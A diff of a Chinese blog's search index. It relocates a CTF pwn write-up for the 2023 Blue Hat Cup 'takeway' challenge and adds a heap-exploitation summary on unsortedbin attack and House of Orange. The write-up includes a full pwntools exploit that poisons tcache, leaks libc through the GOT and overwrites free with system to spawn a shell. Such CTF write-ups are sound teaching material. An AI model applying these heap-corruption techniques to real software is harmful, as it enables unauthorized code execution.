@@ -6,6 +6,7 @@
     <content><![CDATA[<blockquote class="blockquote-center">
 baby一点都不baby...houseoforange+unsortedbinattack
 </blockquote>
+<span id="more"></span>
 <h1 id="x00-逆向分析">0x00 逆向分析</h1>
 <ol type="1">
 <li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
@@ -13,11 +14,11 @@ pwn'了解到有可能是houseoforange</li>
 <li>add函数，两个约束（1. 最多申请32个chunk 2.
 chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
 attack或者unsortedbin
-attack来打（但这里没有free，就导致fastbin很难利用） [[Pasted image
-20230922101040.png]]</li>
-<li>edit函数 [[Pasted image 20230922101820.png]]</li>
-<li>show函数，只打印了8个字节就很难受 [[Pasted image
-20230922101901.png]]</li>
+attack来打（但这里没有free，就导致fastbin很难利用） <img
+src="/pic/Pasted%20image%2020230922101040.png" /></li>
+<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
+<li>show函数，只打印了8个字节就很难受 <img
+src="/pic/Pasted%20image%2020230922101901.png" /></li>
 </ol>
 <h1 id="x01-思路分析">0x01 思路分析</h1>
 <ol type="1">
@@ -70,6 +71,124 @@ Q2：
       <tags>
         <tag>WriteUp</tag>
         <tag>Heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
+    <url>/2023/08/26/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+学艺不精...对于"读/写函数对指针的利用"没那么敏感（
+</blockquote>
+<span id="more"></span>
+<h1 id="xff-说在前面">0xff 说在前面</h1>
+<p>下文EXP中，leak堆地址的部分需要"伪爆破"，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行
+<a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令:
+7c9pe6</p>
+<h1 id="x00-exploitations">0x00 Exploitations</h1>
+<ol type="1">
+<li>tcachebin libc2.31
+<ol type="1">
+<li>tcachebin poisoning</li>
+<li>版本判断
+<ol type="1">
+<li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
+<li>tcache有doublefree检测，则是2.28以上</li>
+<li>有tcache，则是2.26以上</li>
+</ol></li>
+</ol></li>
+<li>UAF</li>
+<li>利用题目提供的堆表+puts/read进行任意地址读写</li>
+</ol>
+<h1 id="x01-反汇编修改">0x01 反汇编修改</h1>
+<pre><code>    首先进行一个反汇编的读   </code></pre>
+<blockquote>
+<p>trick: IDA中对变量按Y键可以改变变量类型</p>
+</blockquote>
+<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
+strcspn是从字符串中返回不含“所查找字符”的子字符串的长度 <img
+src="/pic/Pasted%20image%2020230826231015.png" /> delete:
+指针未置零，一眼UAF <img
+src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
+src="/pic/Pasted%20image%2020230826231127.png" /></p>
+<h1 id="x02-分析与思路构造">0x02 分析与思路构造</h1>
+<blockquote>
+<p>分析部分</p>
+</blockquote>
+<ol type="1">
+<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28
+<ol type="1">
+<li>没办法直接用unsortedbin leak libc</li>
+<li>不能通过填满tcachebin来绕过tcache机制</li>
+<li>tcachebins poisoning
+<ol type="1">
+<li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
+<li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
+</ol></li>
+</ol></li>
+<li>分析modify: 有puts/read
+<ol type="1">
+<li>可能通过puts"直到遇到换行符才停止输出"的原理来泄露什么东西</li>
+</ol></li>
+<li>分析delete
+<ol type="1">
+<li>UAF</li>
+</ol></li>
+<li>远程测试libc版本
+<ol type="1">
+<li>doubleFree有限制，2.28以上</li>
+<li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
+</ol></li>
+</ol>
+<blockquote>
+<p>思路构造部分</p>
+</blockquote>
+<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin
+poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。<br />
+后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted
+bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak
+libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（
+打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
+<p>综上，思路为：<br />
+1. 利用tcachebin的bk泄露堆地址 2.
+在heapList伪造chunk，修改chunk0_ptr为"puts_got-8" 3.
+puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址 4.
+通过gdb发现"puts_got-8"正好是"free_got" 5.
+而read函数正好是修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
+6. 由于chunk0_ptr,
+chunk1_ptr均被修改，所以我们要找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh
+7. free chunk2 --&gt; getshell！ # 0x03 分步解题 1.
+patchelf，根据远程调试选择了libc2.31 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure> 2.
+利用tcachebin的bk泄露堆地址 可以看到bk是指向tcachebin_entries[3]的 <img
+src="/pic/Pasted%20image%2020230827001916.png" /> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)     # 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span><br><span class="line">delete(0)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;)) # 注：这里我没想到更好的方法，heap_addr有可能是三字节</span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br></pre></td></tr></table></figure> 3.
+通过tcache poisoning在heapList段伪造chunk2， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(1)                        # 把上一步申请的chunk1放进tcachebin</span><br><span class="line"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span><br><span class="line">payload = p64(heap_addr + 0x290) # 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span><br><span class="line">fill(1,payload)                  </span><br><span class="line">alloc(2,payload1,payload2)       # 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span><br></pre></td></tr></table></figure> 4.
+申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误:
+下图“加上下一个chunk的prev_size构成了chunk2”中的"chunk2"应为chunk3）
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
+读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts<br />
+5.
+修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br></pre></td></tr></table></figure> 6.
+找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh然后free掉他，getshell！
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure></p>
+<h1 id="x04-完整exp">0x04 完整EXP</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;101.200.234.115&#x27;</span><br><span class="line">port = 42490</span><br><span class="line">file = &#x27;./takeway&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./takeway&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,name,remark):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index&#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name: &#x27;, name)</span><br><span class="line">  io.sendafter(&#x27;remark: &#x27;, remark)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def fill(index,name):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name is: &#x27;, name)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload1 = &#x27;\x00&#x27;</span><br><span class="line">payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)</span><br><span class="line">delete(0)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">delete(1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = p64(heap_addr + 0x290)</span><br><span class="line">fill(1,payload)</span><br><span class="line">alloc(2,payload1,payload2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="x05-总结">0x05 总结</h1>
+<p>这题太遗憾了...最后也没做出来。不过做一窍不通的题收获才最大。<br />
+做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br />
+对tcachebin的第一印象如下:<br />
+1. 概述<br />
+1. 0x10~0x410（貌似是）的chunk 2. LIFO 3.
+大小只有7，free满以后再free就会放到对应的其他bin中 4.
+2.28及以下的libc不检测double free 2. 伪造chunk 1.
+安全性比fastbin还差，不检验fd指向chunk的size直接申请 3. leak堆地址 1.
+2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry
+目前就想到这些，这次多亏队友带飞，进半决赛了XD</p>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>WriteUp, Heap</tag>
       </tags>
   </entry>
   <entry>
@@ -275,122 +394,81 @@ pwn的环境搭建有了一点印象，但里面的大部分内容我都看不�
       </tags>
   </entry>
   <entry>
-    <title>2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
-    <url>/2023/08/26/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
+    <title>Heap常规利用方式总结</title>
+    <url>/2023/09/22/Heap%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
-学艺不精...对于"读/写函数对指针的利用"没那么敏感（
+大佬都有这种总结性的wp，那我也邯郸学步一下 :P
 </blockquote>
 <span id="more"></span>
-<h1 id="xff-说在前面">0xff 说在前面</h1>
-<p>下文EXP中，leak堆地址的部分需要"伪爆破"，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行
-<a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令:
-7c9pe6</p>
-<h1 id="x00-exploitations">0x00 Exploitations</h1>
-<ol type="1">
-<li>tcachebin libc2.31
-<ol type="1">
-<li>tcachebin poisoning</li>
-<li>版本判断
-<ol type="1">
-<li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
-<li>tcache有doublefree检测，则是2.28以上</li>
-<li>有tcache，则是2.26以上</li>
-</ol></li>
-</ol></li>
-<li>UAF</li>
-<li>利用题目提供的堆表+puts/read进行任意地址读写</li>
-</ol>
-<h1 id="x01-反汇编修改">0x01 反汇编修改</h1>
-<pre><code>    首先进行一个反汇编的读   </code></pre>
+<h1 id="unsortedbin-attack">Unsortedbin Attack</h1>
+<h2 id="概述">概述</h2>
+<p>Unsortedbinattack分为leak和write两部分，leak是指“当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址，而这个地址可以通过查看libc的二进制文件逆向得出”，write是指“”。此外，unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk</p>
+<h2 id="申请fake_chunk">申请fake_chunk</h2>
+<p><strong>2.23版本</strong> - 初状态<br />
+unsortedbin --&gt; chunk_victim</p>
 <blockquote>
-<p>trick: IDA中对变量按Y键可以改变变量类型</p>
+<p>此时我们令chunk_victim.bk = fake_chunk_head</p>
 </blockquote>
-<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
-strcspn是从字符串中返回不含“所查找字符”的子字符串的长度 <img
-src="/pic/Pasted%20image%2020230826231015.png" /> delete:
-指针未置零，一眼UAF <img
-src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
-src="/pic/Pasted%20image%2020230826231127.png" /></p>
-<h1 id="x02-分析与思路构造">0x02 分析与思路构造</h1>
+<ul>
+<li>末状态<br />
+unsortedbin --&gt; chunk_victim --&gt; fake_chunk</li>
+</ul>
 <blockquote>
-<p>分析部分</p>
+<p>连续申请两个chunk即可申请到fake_chunk</p>
 </blockquote>
-<ol type="1">
-<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28
-<ol type="1">
-<li>没办法直接用unsortedbin leak libc</li>
-<li>不能通过填满tcachebin来绕过tcache机制</li>
-<li>tcachebins poisoning
-<ol type="1">
-<li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
-<li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
-</ol></li>
-</ol></li>
-<li>分析modify: 有puts/read
-<ol type="1">
-<li>可能通过puts"直到遇到换行符才停止输出"的原理来泄露什么东西</li>
-</ol></li>
-<li>分析delete
-<ol type="1">
-<li>UAF</li>
-</ol></li>
-<li>远程测试libc版本
-<ol type="1">
-<li>doubleFree有限制，2.28以上</li>
-<li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
-</ol></li>
-</ol>
-<blockquote>
-<p>思路构造部分</p>
-</blockquote>
-<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin
-poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。<br />
-后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted
-bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak
-libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（
-打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
-<p>综上，思路为：<br />
-1. 利用tcachebin的bk泄露堆地址 2.
-在heapList伪造chunk，修改chunk0_ptr为"puts_got-8" 3.
-puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址 4.
-通过gdb发现"puts_got-8"正好是"free_got" 5.
-而read函数正好是修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
-6. 由于chunk0_ptr,
-chunk1_ptr均被修改，所以我们要找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh
-7. free chunk2 --&gt; getshell！ # 0x03 分步解题 1.
-patchelf，根据远程调试选择了libc2.31 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure> 2.
-利用tcachebin的bk泄露堆地址 可以看到bk是指向tcachebin_entries[3]的 <img
-src="/pic/Pasted%20image%2020230827001916.png" /> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)     # 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span><br><span class="line">delete(0)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;)) # 注：这里我没想到更好的方法，heap_addr有可能是三字节</span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br></pre></td></tr></table></figure> 3.
-通过tcache poisoning在heapList段伪造chunk2， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(1)                        # 把上一步申请的chunk1放进tcachebin</span><br><span class="line"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span><br><span class="line">payload = p64(heap_addr + 0x290) # 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span><br><span class="line">fill(1,payload)                  </span><br><span class="line">alloc(2,payload1,payload2)       # 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span><br></pre></td></tr></table></figure> 4.
-申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误:
-下图“加上下一个chunk的prev_size构成了chunk2”中的"chunk2"应为chunk3）
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
-读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts<br />
-5.
-修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br></pre></td></tr></table></figure> 6.
-找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh然后free掉他，getshell！
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure></p>
-<h1 id="x04-完整exp">0x04 完整EXP</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;101.200.234.115&#x27;</span><br><span class="line">port = 42490</span><br><span class="line">file = &#x27;./takeway&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./takeway&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,name,remark):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index&#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name: &#x27;, name)</span><br><span class="line">  io.sendafter(&#x27;remark: &#x27;, remark)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def fill(index,name):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name is: &#x27;, name)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload1 = &#x27;\x00&#x27;</span><br><span class="line">payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)</span><br><span class="line">delete(0)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">delete(1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = p64(heap_addr + 0x290)</span><br><span class="line">fill(1,payload)</span><br><span class="line">alloc(2,payload1,payload2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="x05-总结">0x05 总结</h1>
-<p>这题太遗憾了...最后也没做出来。不过做一窍不通的题收获才最大。<br />
-做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br />
-对tcachebin的第一印象如下:<br />
-1. 概述<br />
-1. 0x10~0x410（貌似是）的chunk 2. LIFO 3.
-大小只有7，free满以后再free就会放到对应的其他bin中 4.
-2.28及以下的libc不检测double free 2. 伪造chunk 1.
-安全性比fastbin还差，不检验fd指向chunk的size直接申请 3. leak堆地址 1.
-2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry
-目前就想到这些，这次多亏队友带飞，进半决赛了XD</p>
+<h1 id="houseoforange">HouseofOrange</h1>
+<h2 id="概述-1">概述</h2>
+<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。<br />
+## 伪造chunk需求 1. top_chunk的结束地址必须页对齐 -
+一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可
+2. top_chunk.size &gt;= MINSIZE 3. top_chunk.size &lt; chunk_size +
+MINSIZE 4. top_chunk.prev_inuse == 1 - 第一点中说的0xfe0要变为0xfe1</p>
 ]]></content>
       <categories>
         <category>Pwn</category>
       </categories>
       <tags>
-        <tag>WriteUp, Heap</tag>
+        <tag>Heap</tag>
+        <tag>Summary</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>异世界见闻录(1)</title>
